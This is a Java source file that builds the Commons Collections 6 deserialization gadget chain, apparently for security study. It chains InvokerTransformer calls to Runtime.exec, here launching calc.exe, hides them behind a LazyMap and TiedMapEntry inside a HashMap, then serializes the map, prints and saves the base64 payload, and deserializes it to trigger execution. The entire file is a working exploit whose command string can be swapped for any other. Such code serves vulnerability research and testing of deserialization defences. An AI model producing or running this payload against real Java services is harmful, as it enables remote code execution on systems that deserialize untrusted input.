import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ObjectInputStream;
import java.util.HashMap;
import java.util.Map;

public class HashMapCC6 {
    public static void main(String[] args) throws Exception{
        Transformer[] fakeTransformers = {new ConstantTransformer(1)};

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
                new ConstantTransformer(1),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);

        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);

        TiedMapEntry entry = new TiedMapEntry(outerMap, "foo");
        HashMap expMap = new HashMap();
        expMap.put(entry, null);

        Util.setValue(chainedTransformer, "iTransformers", transformers);

        innerMap.remove("foo");

        byte[] bytes = Util.toSerial(expMap);
        System.out.println(Util.b64encode(bytes));

        Util.writeSerialToFile(expMap);

        ObjectInputStream inputStream = Util.fromSerial(bytes);

        inputStream.readObject();
    }
}
